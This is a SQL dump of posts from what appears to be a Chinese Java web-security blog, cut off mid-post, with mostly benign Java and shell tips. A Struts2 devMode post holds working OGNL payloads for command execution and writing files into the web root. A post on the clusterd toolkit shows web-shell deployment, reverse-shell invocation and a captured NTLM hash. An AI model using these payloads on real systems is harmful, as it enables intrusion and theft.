true\">攻击JavaWeb应用[1]-JavaEE 基础\r\n攻击JavaWeb应用[2]-CS交互安全\r\n攻击JavaWeb应用[3]-SQL注入[1]\r\n攻击JavaWeb应用[4]-SQL注入[2]\r\n攻击JavaWeb应用[5]-MVC安全\r\n攻击JavaWeb应用[6]-程序架构与代码审计\r\n攻击JavaWeb应用[7]-Server篇[1]\r\n攻击JavaWeb应用[8]-后门篇\r\n攻击JavaWeb应用[9]-Server篇[2]</pre>\r\n<pre class=\"brush: java; gutter: true\"></pre>\r\n<pre class=\"brush: java; gutter: true\"></pre>', null, '2014-01-20 20:53:01', '1', '754', null, '2', '2014-01-21 10:28:45'), ('576', '1', '15', 'Tomcat7.0.30以上全局Filter加载顺序问题', '园长', '好吧又被Tom猫坑了，因为上一次是解决Tomcat6和Tomcat7的加载问题被坑了。<a href=\"http://javaweb.org/?p=49\">Tomcat 版本带来的web.xml filter和servlert配置的变化</a> 。昨天测试发现Tomcat7.0.30再一次修改了Filter的加载顺序。\n<p>在org.apache.catalina.core.ApplicationFilterRegistration.java的版本变动(<strong>修改74-78行、103-107行</strong>)：</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2014/01/14.jpg\"><img class=\"alignnone size-full wp-image-577\" title=\"1\" src=\"http://javaweb.org/wp-content/uploads/2014/01/14.jpg\" alt=\"\" width=\"1436\" height=\"800\" /></a></p>\n<p>对比下发现加载的顺序变化了，Tomcat7.0.29的isMatchAfter判断的顺序反了。所以想办法把 顺序弄回去就行了。把context.addFilterMapBefore(filterMap);换到if里面ok。</p>\n<p>修改完源码把catalina.jar里面的class文件替换，一切正常。</p>', null, '2014-01-24 11:42:12', '1', '803', null, '0', '2014-01-24 11:48:18'), ('588', '1', '14', 'Struts2开发模式下“最新漏洞”', '园长', '<a href=\"http://www.pwntester.com/blog/2014/01/21/struts-2-devmode/\">Struts 2 Devmode: An OGNL Backdoor</a> （Struts2 开发模式：一个OGNL后门）。这个漏洞必须Web应用开启开发模式，在struts.xml需要配置：&lt;constant name=\"struts.devMode\" value=\"true\" /&gt;这一行配置一般会在项目开发或未上线的时候用，所以利用价值不高。\n<p>漏洞利用详情在老外的文章也有了，这个漏洞应该不会让各位加班吧线上根本就不应该有开启开发模式的。修复方案很简单，删除开发模式那行代码就行了。好了大家好好过年吧。</p>\n<pre class=\"brush: java; gutter: true\">debug=command&amp;expression=#f=#_memberAccess.getClass().getDeclaredField(&#039;allowStaticMethodAccess&#039;),\n#f.setAccessible(true),\n#f.set(#_memberAccess,true),\n#req=@org.apache.struts2.ServletActionContext@getRequest(),\n#resp=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),\n#resp.println(#req.getRealPath(&quot;/&quot;)),\n%23resp.close()</pre>\n<pre class=\"brush: java; gutter: true\">debug=command&amp;expression=#f=#_memberAccess.getClass().getDeclaredField(&#039;allowStaticMethodAccess&#039;),\n#f.setAccessible(true),\n#f.set(#_memberAccess,true),\n#req=@org.apache.struts2.ServletActionContext@getRequest(),\n#resp=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),\n#a=(new java.lang.ProcessBuilder(new java.lang.String[]{&#039;netstat&#039;,&#039;-an&#039;})).start(),\n#b=#a.getInputStream(),\n#c=new java.io.InputStreamReader(#b),\n#d=new java.io.BufferedReader(#c),\n#e=new char[1000],\n#d.read(#e),\n#resp.println(#e),\n#resp.close()</pre>\n<pre class=\"brush: actionscript3; gutter: true\">debug=command&amp;expression=%23f=%23_memberAccess.getClass().getDeclaredField(&#039;allowStaticMethodAccess&#039;),%23f.setAccessible(true),%23f.set(%23_memberAccess,true%29,%23req=@org.apache.struts2.ServletActionContext@getRequest%28%29,%23resp=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23p%3d%23req.getRealPath(%22/%22)%2b%23req.getParameter(%22f%22),\n%23s%3dnew+java.io.RandomAccessFile(%23p,%22rw%22),%23s.write(%23req.getParameter(%22c%22).getBytes()),%23s.close(),\n%23resp.println(%23p%3d%23req.getRealPath(%22/%22)),%23resp.close()&amp;f=文件.jsp&amp;c=内容</pre>', null, '2014-01-26 23:07:01', '1', '548', null, '2', '2014-12-13 17:35:19'), ('598', '1', '9', 'mac 控制台高亮.bash_profile', '园长', '编辑当前用户下的.bash_profile文件(默认不存在)\n<p>vim ~/.bash_profile</p>\n<p>复制：</p>\n<pre class=\"brush: bash; gutter: true\">export CLICOLOR=1\nexport LSCOLORS=ExFxCxDxBxegedabagacad\nalias ll=&quot;ls -l&quot;\nalias la=&quot;ls -a&quot;\nalias l=&quot;ls -a -l&quot;\nalias subl=&quot;/Applications/Sublime\\ Text.app/Contents/SharedSupport/bin/subl&quot;\ntxtblk=&#039;\\e[0;30m&#039; # Black - Regular\ntxtred=&#039;\\e[0;31m&#039; # Red\ntxtgrn=&#039;\\e[0;32m&#039; # Green\ntxtylw=&#039;\\e[0;33m&#039; # Yellow\ntxtblu=&#039;\\e[0;34m&#039; # Blue\ntxtpur=&#039;\\e[0;35m&#039; # Purple\ntxtcyn=&#039;\\e[0;36m&#039; # Cyan\ntxtwht=&#039;\\e[0;37m&#039; # White\nbldblk=&#039;\\e[1;30m&#039; # Black - Bold\nbldred=&#039;\\e[1;31m&#039; # Red\nbldgrn=&#039;\\e[1;32m&#039; # Green\nbldylw=&#039;\\e[1;33m&#039; # Yellow\nbldblu=&#039;\\e[1;34m&#039; # Blue\nbldpur=&#039;\\e[1;35m&#039; # Purple\nbldcyn=&#039;\\e[1;36m&#039; # Cyan\nbldwht=&#039;\\e[1;37m&#039; # White\nunkblk=&#039;\\e[4;30m&#039; # Black - Underline\nundred=&#039;\\e[4;31m&#039; # Red\nundgrn=&#039;\\e[4;32m&#039; # Green\nundylw=&#039;\\e[4;33m&#039; # Yellow\nundblu=&#039;\\e[4;34m&#039; # Blue\nundpur=&#039;\\e[4;35m&#039; # Purple\nundcyn=&#039;\\e[4;36m&#039; # Cyan\nundwht=&#039;\\e[4;37m&#039; # White\nbakblk=&#039;\\e[40m&#039;   # Black - Background\nbakred=&#039;\\e[41m&#039;   # Red\nbadgrn=&#039;\\e[42m&#039;   # Green\nbakylw=&#039;\\e[43m&#039;   # Yellow\nbakblu=&#039;\\e[44m&#039;   # Blue\nbakpur=&#039;\\e[45m&#039;   # Purple\nbakcyn=&#039;\\e[46m&#039;   # Cyan\nbakwht=&#039;\\e[47m&#039;   # White\ntxtrst=&#039;\\e[0m&#039;    # Text Reset\n#-------------------------------------------------------------\n# The bash prompt\n#-------------------------------------------------------------\nPS1=&quot;[$txtgrn\\u@\\h:\\W$txtrst]\\$ &quot;\n# PS1=&quot;[\\u@\\h \\W]\\$ &quot; # Linux风格\n# &quot;\\h:\\W \\u\\$&quot; # Mac原生 echo $PS1</pre>\n<p>然后：source ~/.bash_profile</p>', null, '2014-02-07 14:48:23', '1', '772', null, '0', '2014-02-10 23:27:30'), ('639', '1', '27', 'JavaSwing 获取File图标', '园长', '<a href=\"itss://chm/javax/swing/filechooser/package-summary.html\">javax.swing.filechooser</a>.<a href=\"itss://chm/javax/swing/filechooser/FileSystemView.html\">FileSystemView</a>\n<p><strong>javax.swing.filechooser</strong><strong></p>\n<p>类 FileSystemView</strong></p>\n<p><a href=\"itss://chm/java/lang/Object.html\">java.lang.Object</a></p>\n<p><strong>javax.swing.filechooser.FileSystemView</strong></p>\n<p>public abstract class <strong>FileSystemView</strong></p>\n<p>extends <a href=\"itss://chm/java/lang/Object.html\">Object</a></p>\n<p>FileSystemView 是 JFileChooser 的文件系统网关。由于 JDK1.1 File API 不允许对诸如根分区、文件类型信息或隐藏文件位之类的信息进行访问，此类被设计成能够直接获得尽可能多的特定于 OS 的文件系统信息。</p>\n<p>Java Licensees 可能想要提供 FileSystemView 的不同实现来更好地处理给定操作系统。</p>\n<p><strong>getSystemIcon</strong></p>\n<p>public <a href=\"itss://chm/javax/swing/Icon.html\">Icon</a> <strong>getSystemIcon</strong>(<a href=\"itss://chm/java/io/File.html\">File</a> f)</p>\n<p>在系统文件浏览器中显示的文件、目录或文件夹的图标。以 Windows 为例：\"M:\\\" 目录显示 CD-ROM 图标。 默认实现从 ShellFolder 类获取信息。</p>\n<p><strong>参数：</strong></p>\n<p>f - File 对象</p>\n<p><strong>返回：</strong></p>\n<p>本机文件选择器显示的图标</p>\n<p><strong>从以下版本开始：</strong></p>\n<p>1.4</p>\n<p><strong>另请参见：</strong></p>\n<p><a href=\"itss://chm/javax/swing/JFileChooser.html#getIcon(java.io.File)\">JFileChooser.getIcon(java.io.File)</a></p>\n<p>Demo-获取C盘图标：</p>\n<pre class=\"brush: java; gutter: true\">JLabel jLabel1 = new JLabel();\njLabel1.setText(&quot;jLabel1&quot;);\nIcon ico = FileSystemView.getFileSystemView().getSystemIcon(new File(&quot;c:/&quot;));\njLabel1.setIcon(ico);</pre>', null, '2014-02-10 13:33:17', '1', '524', null, '0', '2014-08-14 11:08:49'), ('643', '1', '3', '利用NetBeans IDE 和Scene Builder 快速开发 JavaFX', '园长', '首先需要安装<strong><a href=\"http://www.oracle.com/technetwork/java/javafx/tools/index.html\">JavaFX Scene Builder</a>和<a href=\"https://netbeans.org/community/releases/80/\">Netbeans</a> </strong>,然后创建一个JavaFX FXML工程。\n<p><strong>创建JavaFX FXML工程</strong></p>\n<p><strong></strong>1、打开NetBeans IDE 主菜单, 选择 File, 然后选择 New Project.</p>\n<p>2、在新的对话框, 选择JavaFX category and JavaFX FXML Applicationproject, 如图 1 点击next.Figure 1-1</p>\n<p>图1：Create New JavaFX FXML Application Project：</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2014/02/1.gif\"><img class=\"alignnone size-full wp-image-644\" title=\"1\" alt=\"\" src=\"http://javaweb.org/wp-content/uploads/2014/02/1.gif\" width=\"579\" height=\"437\" /></a></p>\n<p>3、在新的JavaFX Application 对话框 输入你的项目名称和项目保存位置、FXML文件名. 点击Finish完成创建.如图2。</p>\n<p>图2：</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2014/02/2.gif\"><img class=\"alignnone size-full wp-image-645\" title=\"2\" alt=\"\" src=\"http://javaweb.org/wp-content/uploads/2014/02/2.gif\" width=\"576\" height=\"475\" /></a></p>\n<p><strong>从Netbeans中启动Scene Builder</strong></p>\n<p>如图3：</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2014/02/3.gif\"><img class=\"alignnone size-full wp-image-646\" title=\"3\" alt=\"\" src=\"http://javaweb.org/wp-content/uploads/2014/02/3.gif\" width=\"343\" height=\"350\" /></a></p>\n<p>当你点击open时NetBeans会自动调用<strong>Scene Builder窗口并打开，在<strong>Scene Builder内编辑保存后即可在NetBeans中看到效果</strong>。</strong></p>\n<p>右键编辑xxx.fxml即可看到窗体源码，如图5：</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2014/02/5.gif\"><img class=\"alignnone size-full wp-image-648\" title=\"5\" alt=\"\" src=\"http://javaweb.org/wp-content/uploads/2014/02/5.gif\" width=\"576\" height=\"335\" /></a></p>\n<p>运行JavaFX：</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2014/02/6.gif\"><img class=\"alignnone size-full wp-image-649\" title=\"6\" alt=\"\" src=\"http://javaweb.org/wp-content/uploads/2014/02/6.gif\" width=\"340\" height=\"291\" /></a></p>\n<p>FROM：http://docs.oracle.com/javafx/scenebuilder/1/use_java_ides/sb-with-nb.htm#CIHDHEFE</p>', null, '2014-02-10 14:46:16', '1', '557', null, '0', '2014-04-15 14:08:56'), ('653', '1', '3', 'JavaFX WebView Demo', '园长', '<a href=\"http://javaweb.org/wp-content/uploads/2014/02/1.jpg\"><img class=\"alignnone size-full wp-image-654\" title=\"1\" src=\"http://javaweb.org/wp-content/uploads/2014/02/1.jpg\" alt=\"\" width=\"1024\" height=\"722\" /></a>\n<p>code:</p>\n<pre class=\"brush: javafx; gutter: true\">import java.io.IOException;\nimport javafx.application.Application;\nimport javafx.scene.Scene;\nimport javafx.scene.layout.StackPane;\nimport javafx.scene.web.WebEngine;\nimport javafx.scene.web.WebView;\nimport javafx.stage.Stage;\npublic class Test extends Application {\n    @Override\n    public void start(Stage stage) throws Exception {\n        StackPane root = new StackPane();\n        WebView view = new WebView();\n        WebEngine engine = view.getEngine();\n        engine.load(&quot;http://javaweb.org/&quot;);\n        root.getChildren().add(view);\n        Scene scene = new Scene(root, 1024, 700);\n        stage.setScene(scene);\n        stage.show();\n    }\n    public static void main(String[] args) throws IOException {\n        Application.launch(args);\n    }\n}</pre>', null, '2014-02-10 18:40:15', '1', '579', null, '0', '2014-02-10 18:40:15'), ('670', '1', '14', 'Apache Commons FileUpload 和 Apache Tomcat 拒绝服务', '园长', 'Multipart  boundary  边界检查问题（分割线长度大于4091的）导致拒绝服务（死循环）\n<p><a href=\"http://javaweb.org/wp-content/uploads/2014/02/11.jpg\"><img class=\"alignnone size-full wp-image-671\" title=\"1\" src=\"http://javaweb.org/wp-content/uploads/2014/02/11.jpg\" alt=\"\" width=\"800\" height=\"391\" /></a></p>\n<p>漏洞详情：<a href=\"http://blog.spiderlabs.com/2014/02/cve-2014-0050-exploit-with-boundaries-loops-without-boundaries.html?utm_source=feedburner&amp;utm_medium=feed&amp;utm_campaign=Feed%3A+SpiderlabsAnterior+(SpiderLabs+Anterior)\">CVE-2014-0050: Exploit with Boundaries, Loops without Boundaries</a></p>\n<p>漏洞测试脚本：<a href=\"http://pan.baidu.com/s/1dDHxqrn \">cve-2014-0050.rb</a></p>', null, '2014-02-14 19:24:09', '1', '640', null, '0', '2014-02-14 19:24:09'), ('678', '5', '12', 'clusterd 开源(python)服务器攻击工具包', 'Anonymous', '下载地址：<a href=\"http://pan.baidu.com/s/1ntFfgFJ\">clusterd 开源(python)服务器攻击工具包.zip</a>\n<p>GitHub项目地址：https://github.com/hatRiot/clusterd</p>\n<p>瞎翻译的，凑合着看。</p>\n<p>clusterd是一个基于python的支持自动服务器指纹识别的攻击工具包。</p>\n<p>依赖环境：Python &gt;= 2.7.x Requests &gt;= 2.2.x。</p>\n<p>GitHub：<span style=\"font-family: Consolas, Monaco, monospace; font-size: 12px; line-height: 18px;\">git clone https://github.com/hatRiot/clusterd.git</span></p>\n<p><strong>clusterd特性：</strong></p>\n<p><ul></p>\n<p>	<li>JBoss</p>\n<p><ul></p>\n<p>	<li>支持Jboss 3.x - 8.0</li></p>\n<p>	<li>当前支持：</p>\n<p><ul></p>\n<p>	<li>/jmx-console/MainDeployer for 3.x, 4.x, and 6.x</li></p>\n<p>	<li>/jmx-console/DeploymentFileRepository for 3.x, 4.x, and 5.x</li></p>\n<p>	<li>/web-console/Invoker (MainDeployer) for 3.x, 4.x, and 6.x</li></p>\n<p>	<li>/web-console/Invoker (BSHDeployer) for 3.x and 4.x</li></p>\n<p>	<li>/invoker/JMXInvokerServlet for 3.x and 4.x</li></p>\n<p>	<li>/invoker/EJBInvokerServlet for 3.x and 4.x</li></p>\n<p>	<li>/management for 7.x, 8.x</li></p>\n<p></ul></p>\n<p></li></p>\n<p>	<li>部署war包</li></p>\n<p>	<li>获取主机操作系统信息</li></p>\n<p>	<li>动词（请求方式）篡改漏洞 (CVE-2010-0738)</li></p>\n<p>	<li>凭证/路径 泄漏漏洞 (CVE-2005-2006)</li></p>\n<p></ul></p>\n<p></li></p>\n<p></ul></p>\n<p><ul></p>\n<p>	<li>ColdFusion</p>\n<p><ul></p>\n<p>	<li>支持版本 6 - 10</li></p>\n<p>	<li>当前支持:</p>\n<p><ul></p>\n<p>	<li>9.x 和 10.x 任务计划</li></p>\n<p></ul></p>\n<p></li></p>\n<p>	<li>6 - 10版本Hash检索</li></p>\n<p>	<li>RDS admin 绕过(CVE-2013-0632)</li></p>\n<p></ul></p>\n<p></li></p>\n<p>	<li>WebLogic</p>\n<p><ul></p>\n<p>	<li>支持版本 7, 8.1, 11, and 12</li></p>\n<p>	<li>测试： 11.x and 12.x</li></p>\n<p>	<li>在 T3/T3S 部署war</li></p>\n<p>	<li>获取主机操作系统信息</li></p>\n<p></ul></p>\n<p></li></p>\n<p>	<li>Tomcat指纹</p>\n<p><ul></p>\n<p>	<li>支持版本 Tomcat3.x - 8.x</li></p>\n<p>	<li>全版本后台部署支持</li></p>\n<p>	<li>部署war包</li></p>\n<p>	<li>获取主机操作系统信息</li></p>\n<p></ul></p>\n<p></li></p>\n<p>	<li>可简单的添加其他平台API, 指纹, deployers, 和利用</li></p>\n<p>	<li>漏洞利用和各种辅助模块</li></p>\n<p></ul></p>\n<p>使用方法示例：</p>\n<pre class=\"brush: python; gutter: true\">bryan@debdev:~/tools/clusterd$ ./clusterd.py\nclusterd/0.1 - clustered attack toolkit\nSupporting jboss, coldfusion, weblogic, tomcat\nusage: ./clusterd.py [options]\noptional arguments:\n-h, --help show this help message and exit\nConnection:\nOptions for configuring the connection\n-i [ip address] Server address\n-iL [file] Server list\n-p [port] Server port\n--proxy [proxy://server:port]\nConnect through proxy [http|https]\n--proxy-auth [username:password]\nProxy credentials\n--timeout [seconds] Connection timeout [5s]\n--random-agent Use a random User-Agent for requests\n--ssl Force SSL\nRemote Host:\nSettings specific to the remote host\n-a [jboss|coldfusion|weblogic|tomcat]\nHint at remote host service\n-o [windows|linux] Hint at remote host OS\n-v [version] Specific version to test\n--usr-auth [username:password]\nLogin credentials for service\n--fingerprint Fingerprint the remote system\n--arch [x86|x64] Specify remote OS architecture\nDeploy:\nDeployment flags and settings\n--deploy [file] Deploy to the discovered service\n--deployer [deployer]\nSpecify a deployer to use\n--invoke Invoke payload after deployment\n-b [user] Brute force credentials for user [admin]\n--wordlist [path] Wordlist for brute forcing passwords\njboss modules:\n--jb-info Dump host information\n--jb-list List deployed WARs\n--jb-smb Obtain SMB hash\ncoldfusion modules:\n--cf-info Dump host information\nweblogic modules:\n--wl-info Gather WebLogic info\n--wl-list List deployed apps\n--wl-smb Obtain SMB hash\ntomcat modules:\n--tc-info Gather Tomcat info\n--tc-list List deployed WARs\n--tc-smb Obtain SMB hash\nOther:\nMiscellaneous flags\n--deploy-list List all available deployers\n--aux-list List all available exploits\n--gen-payload [host:port] for reverse connection\nGenerate a reverse shell payload\n-d Enable debug output\n-l Log output to file [$time$_log.log]</pre>\n<p><strong>jboss 指纹和主机信息</strong></p>\n<pre class=\"brush: python; gutter: true\">bryan@debdev:~/tools/clusterd$ ./clusterd.py -i 192.168.1.102 -a jboss --jb-info --random-agent\nclusterd/0.1 - clustered attack toolkit\nSupporting jboss, coldfusion, weblogic, tomcat\n[2014-01-25 06:51PM] Started at 2014-01-25 06:51PM\n[2014-01-25 06:51PM] Servers&#039; OS hinted at windows\n[2014-01-25 06:51PM] Fingerprinting host &#039;192.168.1.102&#039;\n[2014-01-25 06:51PM] Server hinted at &#039;jboss&#039;\n[2014-01-25 06:51PM] Checking jboss version 3.2 JBoss JMX Console...\n[2014-01-25 06:51PM] Checking jboss version 3.2 JBoss Web Console...\n[2014-01-25 06:51PM] Checking jboss version 3.0 JBoss JMX Console...\n[2014-01-25 06:51PM] Checking jboss version 4.2 JBoss JMX Console...\n[2014-01-25 06:51PM] Checking jboss version 4.2 JBoss Web Console...\n[2014-01-25 06:51PM] Checking jboss version 4.0 JBoss JMX Console...\n[2014-01-25 06:51PM] Checking jboss version 4.0 JBoss Web Console...\n[2014-01-25 06:51PM] Checking jboss version 5.1 JBoss Web Manager...\n[2014-01-25 06:51PM] Checking jboss version 5.1 JBoss JMX Console...\n[2014-01-25 06:51PM] Checking jboss version 5.1 JBoss Web Console...\n[2014-01-25 06:51PM] Checking jboss version 5.0 JBoss JMX Console...\n[2014-01-25 06:51PM] Checking jboss version 5.0 JBoss Web Console...\n[2014-01-25 06:51PM] Checking jboss version 6.0 JBoss Web Manager...\n[2014-01-25 06:51PM] Checking jboss version 6.1 JBoss Web Manager...\n[2014-01-25 06:51PM] Checking jboss version 6.1 JBoss JMX Console...\n[2014-01-25 06:51PM] Checking jboss version 6.0 JBoss JMX Console...\n[2014-01-25 06:51PM] Checking jboss version 7.1 JBoss Management...\n[2014-01-25 06:51PM] Checking jboss version 7.0 JBoss Management...\n[2014-01-25 06:51PM] Checking jboss version Any JBoss JMX Invoker Servlet...\n[2014-01-25 06:51PM] Checking jboss version Any JBoss RMI Interface...\n[2014-01-25 06:51PM] Checking jboss version Any JBoss Status Page...\n[2014-01-25 06:51PM] Matched 5 fingerprints for service jboss\n[2014-01-25 06:51PM] JBoss JMX Console (version 5.0)\n[2014-01-25 06:51PM] JBoss Web Console (version 5.0)\n[2014-01-25 06:51PM] JBoss JMX Invoker Servlet (version Any)\n[2014-01-25 06:51PM] JBoss RMI Interface (version Any)\n[2014-01-25 06:51PM] JBoss Status Page (version Any)\n[2014-01-25 06:51PM] Fingerprinting completed.\n[2014-01-25 06:51PM] Attempting to retrieve JBoss info...\n[2014-01-25 06:51PM] ActiveThreadCount: 71\n[2014-01-25 06:51PM] OSArch: amd64\n[2014-01-25 06:51PM] AvailableProcessors: 1\n[2014-01-25 06:51PM] MaxMemory: 518979584\n[2014-01-25 06:51PM] HostAddress: 192.168.1.102\n[2014-01-25 06:51PM] JavaVersion: 1.7.0_45\n[2014-01-25 06:51PM] OSVersion: 6.1\n[2014-01-25 06:51PM] TotalMemory: 282968064\n[2014-01-25 06:51PM] JavaVendor: Oracle Corporation\n[2014-01-25 06:51PM] ActiveThreadGroupCount: 9\n[2014-01-25 06:51PM] FreeMemory: 152545376\n[2014-01-25 06:51PM] OSName: Windows 7\n[2014-01-25 06:51PM] HostName: bryan-PC\n[2014-01-25 06:51PM] JavaVMVersion: 24.45-b08\n[2014-01-25 06:51PM] JavaVMVendor: Oracle Corporation\n[2014-01-25 06:51PM] JavaVMName: Java HotSpot(TM) 64-Bit Server VM\n[2014-01-25 06:51PM] Finished at 2014-01-25 06:51PM</pre>\n<p><strong>jboss5.0 DFS 部署</strong></p>\n<pre class=\"brush: python; gutter: true\">bryan@debdev:~/tools/clusterd$ ./clusterd.py -i 192.168.1.102 -a jboss -v 5 --deploy ./src/lib/cmd.war --random-agent\nclusterd/0.1 - clustered attack toolkit\nSupporting jboss, coldfusion, weblogic, tomcat\n[2014-01-25 06:54PM] Started at 2014-01-25 06:54PM\n[2014-01-25 06:54PM] Servers&#039; OS hinted at windows\n[2014-01-25 06:54PM] Fingerprinting host &#039;192.168.1.102&#039;\n[2014-01-25 06:54PM] Server hinted at &#039;jboss&#039;\n[2014-01-25 06:54PM] Checking jboss version 5.1 JBoss Web Manager...\n[2014-01-25 06:54PM] Checking jboss version 5.1 JBoss JMX Console...\n[2014-01-25 06:54PM] Checking jboss version 5.1 JBoss Web Console...\n[2014-01-25 06:54PM] Checking jboss version 5.0 JBoss JMX Console...\n[2014-01-25 06:54PM] Checking jboss version 5.0 JBoss Web Console...\n[2014-01-25 06:54PM] Checking jboss version Any JBoss JMX Invoker Servlet...\n[2014-01-25 06:54PM] Checking jboss version Any JBoss RMI Interface...\n[2014-01-25 06:54PM] Checking jboss version Any JBoss Status Page...\n[2014-01-25 06:54PM] Matched 5 fingerprints for service jboss\n[2014-01-25 06:54PM] JBoss JMX Console (version 5.0)\n[2014-01-25 06:54PM] JBoss Web Console (version 5.0)\n[2014-01-25 06:54PM] JBoss JMX Invoker Servlet (version Any)\n[2014-01-25 06:54PM] JBoss RMI Interface (version Any)\n[2014-01-25 06:54PM] JBoss Status Page (version Any)\n[2014-01-25 06:54PM] Fingerprinting completed.\n[2014-01-25 06:54PM] This deployer requires a JSP, default to cmd.jsp? [Y/n] &gt;\n[2014-01-25 06:55PM] Preparing to deploy /home/bryan/tools/clusterd/src/lib/cmd.jsp...\n[2014-01-25 06:55PM] Successfully deployed /home/bryan/tools/clusterd/src/lib/cmd.jsp\n[2014-01-25 06:55PM] Finished at 2014-01-25 06:55PM</pre>\n<p><strong>jboss UNC hash 检索</strong></p>\n<pre class=\"brush: python; gutter: true\">bryan@debdev:~/tools/clusterd$ sudo ./clusterd.py -i 192.168.1.102 -a jboss -v4.2 --random-agent --jb-smb\nclusterd/0.1 - clustered attack toolkit\nSupporting jboss, coldfusion, weblogic, tomcat\n[2014-02-08 12:24AM] Started at 2014-02-08 12:24AM\n[2014-02-08 12:24AM] Servers&#039; OS hinted at windows\n[2014-02-08 12:24AM] Fingerprinting host &#039;192.168.1.102&#039;\n[2014-02-08 12:24AM] Server hinted at &#039;jboss&#039;\n[2014-02-08 12:24AM] Checking jboss version 4.2 JBoss JMX Console...\n[2014-02-08 12:24AM] Checking jboss version 4.2 JBoss Web Console...\n[2014-02-08 12:24AM] Checking jboss version Any JBoss JMX Invoker Servlet...\n[2014-02-08 12:24AM] Checking jboss version Any JBoss RMI Interface...\n[2014-02-08 12:24AM] Checking jboss version Any JBoss Status Page...\n[2014-02-08 12:24AM] Matched 5 fingerprints for service jboss\n[2014-02-08 12:24AM] JBoss JMX Console (version 4.2)\n[2014-02-08 12:24AM] JBoss Web Console (version 4.2)\n[2014-02-08 12:24AM] JBoss JMX Invoker Servlet (version Any)\n[2014-02-08 12:24AM] JBoss RMI Interface (version Any)\n[2014-02-08 12:24AM] JBoss Status Page (version Any)\n[2014-02-08 12:24AM] Fingerprinting completed.\n[2014-02-08 12:24AM] Setting up SMB listener..\n[2014-02-08 12:24AM] Invoking UNC loader...\n[2014-02-08 12:24AM] bryan::bryan-PC:1122334455667788:d24a1c43f9d219aa8a38d018ec7e9b89:01010000000000005a4d8bca9e24cf01ad86b744515b143100000000020000000000000000000000\n[2014-02-08 12:24AM] Finished at 2014-02-08 12:24AM\ntomcat deployment and reverse shell invocation\nbryan@debdev:~/tools/clusterd$ ./clusterd.py -i 192.168.1.102 -a tomcat --deploy shell.war --invoke\nclusterd/0.1 - clustered attack toolkit\nSupporting jboss, coldfusion, weblogic, tomcat\n[2014-02-08 12:50AM] Started at 2014-02-08 12:50AM\n[2014-02-08 12:50AM] Servers&#039; OS hinted at windows\n[2014-02-08 12:50AM] Fingerprinting host &#039;192.168.1.102&#039;\n[2014-02-08 12:50AM] Server hinted at &#039;tomcat&#039;\n[2014-02-08 12:50AM] Checking tomcat version 3.3 Tomcat...\n[2014-02-08 12:50AM] Checking tomcat version 3.3 Tomcat Admin...\n[2014-02-08 12:50AM] Checking tomcat version 4.0 Tomcat...\n[2014-02-08 12:50AM] Checking tomcat version 4.1 Tomcat...\n[2014-02-08 12:50AM] Checking tomcat version 4.1 Tomcat Manager...\n[2014-02-08 12:50AM] Checking tomcat version 4.0 Tomcat Manager...\n[2014-02-08 12:50AM] Checking tomcat version 5.5 Tomcat...\n[2014-02-08 12:50AM] Checking tomcat version 5.5 Tomcat Manager...\n[2014-02-08 12:50AM] Checking tomcat version 6.0 Tomcat...\n[2014-02-08 12:50AM] Checking tomcat version 6.0 Tomcat Manager...\n[2014-02-08 12:50AM] Checking tomcat version 7.0 Tomcat...\n[2014-02-08 12:50AM] Checking tomcat version 7.0 Tomcat Manager...\n[2014-02-08 12:50AM] Checking tomcat version 8.0 Tomcat...\n[2014-02-08 12:50AM] Checking tomcat version 8.0 Tomcat Manager...\n[2014-02-08 12:50AM] Matched 2 fingerprints for service tomcat\n[2014-02-08 12:50AM] Tomcat (version 5.5)\n[2014-02-08 12:50AM] Tomcat Manager (version 5.5)\n[2014-02-08 12:50AM] Fingerprinting completed.\n[2014-02-08 12:50AM] Preparing to deploy shell.war...\n[2014-02-08 12:50AM] Deployed shell.war to /shell\n[2014-02-08 12:50AM] shell.war invoked at 192.168.1.102\n[2014-02-08 12:50AM] Finished at 2014-02-08 12:50AM</pre>', null, '2014-02-15 21:30:19', '1', '590', null, '0', '2014-03-11 17:57:22'), ('690', '2', '5', 'OldCMS | 版本 1.0 | 开源、简单、安全的PHP开发框架', 'blue', '<p id=\"part1\">官方网站：<a href=\"http://oldcms.com/\">http://oldcms.com/</a></p>\n<p><strong>1. 程序文件组织</strong></p>\n<pre class=\"brush: php; gutter: true\">| install/                    /* 数据库文件、服务器Rewrite规则 */\n  | oldcms.sql                /* 数据库文件 */\n  | rewrite.txt               /* Rewrite规则(Apache,Nginx) */\n| libs/                       /* Smarty程序目录 */\n| source/                     /* 核心类库、方法 */\n  | class/                    /* 类库 */\n    | Captcha.class.php       /* 验证码类 */\n    | DB.class.php            /* 数据库操作类 */\n    | Image.class.php         /* 图片上传、缩略图类 */\n    | Pager.class.php         /* 分页类 */\n    | PHPMailer.class.php     /* 邮件类 */\n    | Smtp.class.php          /* 邮件类 */\n    | User.class.php          /* 用户类 */\n  | common.php                /* 公共处理页面 */\n  | function.php              /* 核心方法库 */\n  | global.func.php           /* 自定义方法 */\n  | index.php                 /* 首页 */\n  | login.php                 /* 登录 */\n  | register.php              /* 注册 */\n| themes/                     /* 主题模板目录 */\n  | default/\n    | css/\n    | img/\n    | templates/\n      | index.html\n| captcha.php                 /* 验证码图片显示 */\n| config.php                  /* 数据库配置、网站配置等 */\n| init.php                    /* 初始化 */\n| index.php                   /* 程序开始页 */</pre>\n<p><p id=\"part2\"><strong>2. 使用流程</strong></p></p>\n<pre class=\"brush: php; gutter: true\">(1) 将/install/oldcms.sql入库，如需Rewrite则按rewrite.txt重写，然后配置/config.php\n    相关数据库连接等信息。\n(2) 在/index.php里修改$dos数组，同时在/source目录建立相关程序文件，访问url: \n    /index.php?do=index&amp;act=index。\n(3) /themes里为Smarty调用的模板目录，结构比较简单。</pre>\n<p><p id=\"part3\"><strong>3. 登录与注册：</strong>程序包里默认集成了登录和注册模块，如需使用请看相关文件。</p></p>\n<p><p id=\"part4\"><strong>4. 程序安全</strong>：为了增强程序的安全，获取$_GET,$_POST,$_COOKIE等变量值时请尽量使用<strong>Val</strong>方法，具体请看/source/function.php，其它获取的变量值过滤可使用StripStr方法。</p></p>\n<p><p id=\"part5\"><strong>5. 